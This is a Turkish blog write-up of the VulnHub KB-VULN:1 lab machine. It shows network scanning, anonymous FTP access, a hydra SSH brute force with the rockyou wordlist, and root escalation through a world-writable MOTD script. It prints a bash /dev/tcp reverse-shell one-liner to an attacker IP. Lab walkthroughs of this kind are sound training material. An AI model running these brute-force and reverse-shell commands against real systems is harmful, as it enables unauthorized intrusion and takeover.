---
title: "VULNHUB KB VULN:1 Makinası Write Up"
date: 2020-09-17T20:40:54+03:00
draft: false
toc: true
images:
tags: [Vulnhub,write-up,ssh,nmap,hydra] 
categories: [Write-up]
author : "Barcode"
Description : "Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/kb-vuln-1,540/) 'da yer alan medium seviye KB-VULN: 1 adlı makinanın çözümünden bahsedeceğim.Hatalı yada ilave açıklama gerektiren yerler için yorum bırakabilirsiniz. Keyifli okumalar..."
cover : images/vulnhub/kb-vuln1/cover.png
  
---
Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/kb-vuln-1,540/) 'da yer alan medium seviye KB-VULN: 1 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar...

## 1. Keşif Aşaması
{{< text >}}
Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.
{{< /text >}}
```bash
netdiscover -i eth0
```

{{< image src="/images/vulnhub/kb-vuln1/netdiscover.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Ip adresi tespit edildikten sonra nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.

{{< image src="/images/vulnhub/kb-vuln1/nmap.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}
{{< text >}}
Ftp portunda çalışan servisin konfigürasyon ayarları varsayılan olarak bırakıldığı için anonymous erişim açıktır. Ftp servisine bağlanılır ve paylaşıma açık dosyalar incelenir.
{{< /text >}}
{{< image src="/images/vulnhub/kb-vuln1/ftp1.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

**.bash_history** adlı dosya bilgisayara indirilir.

{{< image src="/images/vulnhub/kb-vuln1/ftp2.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}
{{< text >}}
İndirilen dosyanın içeriğine bakıldığından ssh vb. erişimlerde kullanıcıya verilen karşılama mesajının (Günün Mesajı-Message Of The Day(motd)) yer aldığı <i style="color:yellow"> <strong> 00-header </strong></i> dosyasında değişiklik yapıldığı görülmektedir. Yetki yükseltme aşamasında kullanılabilir.
<br>
{{< /text >}}
{{< image src="/images/vulnhub/kb-vuln1/file.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Tarayıcı ile web servisine istek atılır. Oneschool adlı bir web sayfası açılmaktadır. Sayfa kaynak kodları incelendiğinde bir kullanıcı adı tespit edilmektedir.

{{< image src="/images/vulnhub/kb-vuln1/website.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}
{{< text >}}
<br>
{{< /text >}}
{{< image src="/images/vulnhub/kb-vuln1/websource.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}
{{< text >}}
Web dizininde gobuser ile dizin taraması gerçekleştirilir. Yapılan dizin ve alt dizin taramalarında ilk erişim için parola yada giriş paneli tespit edilememiştir. Elde edilen kullanıcı adı ile hydra aracı ile ssh servisine brute force saldırı yapılır.
{{< /text >}}
```terminal
hydra -l sysadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102
```

{{< image src="/images/vulnhub/kb-vuln1/hydra.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

## 2. Erişim Sağlanması

Elde edilen parola ile ssh erişimi sağlanır.

```terminal
[barcode@parrot]─[~]$ ssh sysadmin@192.168.56.102
The authenticity of host '192.168.56.102 (192.168.56.102)' can't be established.
ECDSA key fingerprint is SHA256:9z5jY109u48eo71sMGnTp9s13QY0KGVMI9B/m2mkCZs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.102' (ECDSA) to the list of known hosts.
sysadmin@192.168.56.102's password: 

			WELCOME TO THE KB-SERVER

Last login: Sat Aug 22 18:00:48 2020
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

sysadmin@kb-server:~$
```
sysadmin kullanıcısına ait home dizininde yer alan dosyalar listelenir ve user.txt dosyası okunarak ilk flag elde edilir.

{{< image src="/images/vulnhub/kb-vuln1/userflag.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

## 3. Yetki Yükseltme

İlk olarak _**/etc/update-motd.d/**_ dizinine gidilir ve 00-header dosyasının izinleri kontrol edilir.

```terminal
sysadmin@kb-server:~$ cd /etc/update-motd.d/
sysadmin@kb-server:/etc/update-motd.d$ ls -lsa
total 16
4 drwxr-xr-x  3 root root 4096 Aug 22 17:08 .
4 drwxr-xr-x 92 root root 4096 Sep 11 08:24 ..
4 -rwxrwxrwx  1 root root  989 Aug 22 17:08 00-header
4 drwxr-xr-x  2 root root 4096 Aug 22 17:07 other
```
00-header dosyasında tüm kullanıcılara yazma yetkisi verildiği görülmektedir. Normal kullanımda bu yetki sadece root yetkisinde olmaktadır. Dosya içeriği görüntülenir.

{{< image src="/images/vulnhub/kb-vuln1/header1.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Ssh erişiminde çalışan dosyanın hangi kullanıcı yetkisi ile çalıştırıldığının tespiti için whoami komutu eklenir.

```bash
echo "whoami" >> 00-header
```

```bash
sysadmin@kb-server:/etc/update-motd.d$ cat 00-header 
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release

echo "\n\t\t\tWELCOME TO THE KB-SERVER\n"
whoami
```

Ssh bağlantısı kesilip tekrardan erişim sağlandığında 00-header dosyası içerisinde çalıştırılan dosyaların root yetkisi ile çalıştırıldığı görülmektedir. 

```terminal
sysadmin@192.168.56.102's password: 

			WELCOME TO THE KB-SERVER

root <--- Eklenen komut Çıktısı
Last login: Thu Sep 17 19:06:26 2020 from 192.168.56.1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

Yüksek yetki ile shell bağlantısı sağlamak için 00-header dosyasına aşağıda yer alan komut eklenir ve tekrar erişim sağlanıldığında 4444 numaralı porta shell bağlantısı düşmektedir.

```bash
echo "bash -c 'exec bash -i &>/dev/tcp/192.168.56.101/4444 <&1'" >> 00-header 
```

{{< image src="/images/vulnhub/kb-vuln1/header2.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

{{< text >}}
<br>
{{< /text >}}

{{< image src="/images/vulnhub/kb-vuln1/root.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

{{< text >}}
<br>
Root dizinine gidilir ve flag.txt dosyası okunarak makina çözümlemesi tamamlanır.

{{< /text >}}

{{< image src="/images/vulnhub/kb-vuln1/rootflag.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}
















